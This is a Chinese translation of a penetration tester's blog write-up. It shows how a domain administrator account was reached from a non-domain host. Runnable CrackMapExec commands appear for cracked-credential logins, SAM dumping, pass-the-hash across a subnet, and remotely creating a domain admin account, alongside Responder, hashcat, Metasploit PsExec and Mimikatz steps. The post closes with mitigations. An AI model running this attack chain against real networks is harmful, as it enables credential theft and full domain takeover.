> 原文链接: https://www.anquanke.com//post/id/100191 


# 如何从外部Active Directory获取域管理员权限


                                阅读量   
                                **95731**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者 rb256，文章来源：markitzeroday.com
                                <br>原文地址：[https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t015e5dd0eb61212ded.jpg)](https://p1.ssl.qhimg.com/t015e5dd0eb61212ded.jpg)



## 写在前面的话

我之前曾是一名传统的Web开发人员，这也是让我对信息安全感兴趣的原因之一。除此之外，我平时自己也会去进行各种各样的渗透测试，一开始只是兼职，现在我已经变成一名全职的渗透测试人员了。值得一提的是，在我的渗透测试过程中，活动目录（Active Directory）测试已经成为了我最喜欢的一种渗透测试类型了。<br>
这篇文章介绍的是我在今年年初给其中一名客户所进行的内部网络测试情况。其实在此之前，我已经给这名客户的网络系统进行过测试了，但是这名客户的网络非常难渗透，所以这一次我就有些担心我是否能够成功“入侵”这个网络，因为上次我可是花了九牛二虎之力才成功的。



## 直奔主题

我在内部网络运行的第一个工具就是Responder。这个工具可以从本地子网的LLMNR或NetBIOS请求中获取Windiws哈希，不过这名客户非常机智地禁用掉了LLMNR和NetBIOS请求。除了我在之前对其所进行的渗透测试中获取到的信息之外，我从我的OSCP课程中还学到了一样东西：即首先尝试最简单的东西。如果房间的大门是敞开的，你为什么一定要破窗而入呢？<br>
于是乎，我运行了Responder，当我获取到了如下图所示的哈希输出之后，我惊呆了：

[![](https://p2.ssl.qhimg.com/t016bd9ba76de6c0baa.png)](https://p2.ssl.qhimg.com/t016bd9ba76de6c0baa.png)<br>
当然了，我永远不会在我的文章中泄露客户的凭证信息，所以你在本文中看到的所有数据都是经过了匿名化处理的，而且细节数据我都已经修改过了。<br>
我们可以从这里看到，主机172.16.157.133给我们发送了账号FRONTDESK的NETNTLMv2哈希。在Crack Map Exec（CME）工具的帮助下我们对这台主机的NetBIOS信息进行了检测，并判断这个值是否是某个本地账号的哈希。如果是的话，那么其中的“domain”部分就是主机的用户名了：

```
[SMBv2] NTLMv2-SSP Username : 2-FD-87622FRONTDESK
```

比如说，在此时的场景中，2-FD-87622就应该是主机的NetBIOS名。使用CME查看IP地址后，我们可以看到主机设备的名称：

[![](https://p1.ssl.qhimg.com/t013bbe139338344656.png)](https://p1.ssl.qhimg.com/t013bbe139338344656.png)<br>
那么接下来，我们就可以尝试破解这个哈希值，并获取到明文形式的密码了。在hashcat和密码字典rockyou.txt的帮助下，我们迅速破解出了这个密码。

[![](https://p5.ssl.qhimg.com/t0153097acd44fcf063.png)](https://p5.ssl.qhimg.com/t0153097acd44fcf063.png)<br>
现在，我们手上已经得到了FRONTDEST设备的一系列凭证数据了，当我们再次使用CME来对这台设备进行扫描测试时，返回的就是已破解的凭证信息了：

```
cme smb 172.16.157.133 -u FRONTDESK -p 'Winter2018!' --local-auth
```

[![](https://p3.ssl.qhimg.com/t01df4b296e2b8c5669.png)](https://p3.ssl.qhimg.com/t01df4b296e2b8c5669.png)<br>
我们可以看到上图所示的输出结果中的“Pwn3d！”，这表明它是一个本地管理员账号。因此，这也就意味着我们已经得到了能够导出本地密码哈希的权限了：

```
cme smb 172.16.157.133 -u FRONTDESK -p 'Winter2018!' --local-auth --sam
```

[![](https://p1.ssl.qhimg.com/t01150a32adfa39965e.png)](https://p1.ssl.qhimg.com/t01150a32adfa39965e.png)

现在我们可以看到：

```
FRONTDESK:1002:aad3b435b51404eeaad3b435b51404ee:eb6538aa406cfad09403d3bb1f94785f:::
```

这一次，我们看到的是密码的NTLM哈希，而不是Responder之前所获取到的NETNTLMv2“挑战/响应”哈希。Responder可以从网络数据中捕捉到哈希，但是这种格式跟Windows存储在SAM中的数据格式是有所区别的。<br>
接下来我们就要尝试使用这个本地管理员哈希了，需要注意的是，我们根本就不需要破解这个管理员账号的密码，因为我们只需要使用这个密码哈希就可以了：

```
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5509de4ff0a6eed7048d9f4a61100e51' --local-auth
```

[![](https://p4.ssl.qhimg.com/t016a7995bcc25d2380.png)](https://p4.ssl.qhimg.com/t016a7995bcc25d2380.png)<br>
我们可以使用NTLM存储格式来传递密码哈希，但千万不能使用NETNTLMv2格式（除非你想进行的是SMB中继攻击）。<br>
让我们感到惊讶的是，本地管理员密码竟然在STEWIE设备中再一次出现了，这就是传说中密码重用的情况了。下面给出的是这台主机的NetBIOS信息：

```
$ cme smb 172.16.157.134
SMB 172.16.157.134 445 STEWIE
[*] Windows Server 2008 R2 Foundation 7600 x64 (name:STEWIE) (domain:MACFARLANE)
(signing:False) (SMBv1:True)
```

我们可以看到，这台主机是MACFARLANE域的成员之一，而这个域是我客户的活动目录所在的主域。所以说，一台不在目标域中的计算机里竟然重用了内部网络服务器的本地管理员密码，这你敢信？现在，在Metasploit和PsExec的帮助下，我们就可以将NTLM作为密码，然后利用Metasploit来传递密码哈希并完成入侵渗透了：

[![](https://p4.ssl.qhimg.com/t0194452e79ed3e46dd.png)](https://p4.ssl.qhimg.com/t0194452e79ed3e46dd.png)<br>
运行了相应命令之后，我们成功获取到了目标主机的shell：

[![](https://p3.ssl.qhimg.com/t01b39e228cb894d273.png)](https://p3.ssl.qhimg.com/t01b39e228cb894d273.png)<br>
我们还可以加载Mimikatz模块并读取Windows内存数据来寻找密码：

[![](https://p3.ssl.qhimg.com/t01f3b4b74b0c450376.png)](https://p3.ssl.qhimg.com/t01f3b4b74b0c450376.png)<br>
这样看来，我们似乎得到了域管理员（DA）的账号信息了。那么接下来，我们使用CME来在域控制器中执行了命令，并将我们自己添加为了域管理员（这样操作纯粹是为了方便演示我们的渗透测试，在真实的攻击场景中，为了保证攻击的隐蔽性，我们一般选择使用已发现的账号）。

```
cme smb 172.16.157.135 -u administrator -p 'October17' -x 'net user markitzeroda hackersPassword! /add /domain /y &amp;&amp; net group "domain admins" markitzeroda /add'
```

请注意上述代码中我们所使用的/y参数，它的作用是强制让Windows允许我们将可用的密码长度增加到14个字符以上。<br>
下图显示的是域控制器的远程桌面截图：

[![](https://p3.ssl.qhimg.com/t01a5facc76d5987f35.png)](https://p3.ssl.qhimg.com/t01a5facc76d5987f35.png)



## 总结

因此，如果FRONTDEST设备已经加入了目标域中，我肯定会选择禁用LLMNR（从组策略中禁用），这样一来攻击者在一开始就不会得到该设备的访问权了，因此也就不会得到可以入侵整个域的访问凭证了。当然了，现在还有很多其他的缓解方案，比如说利用LAPS来管理本地管理员密码，或通过设置FilterAdministratorToken来防止SMB登录。<br>
在这篇文章中，我们通过实际的渗透测试来告诉了大家如何通过外部活动目录来获取到域管理员的帐号凭证，希望本文的内容可以给大家平时的渗透测试带来一些灵感。
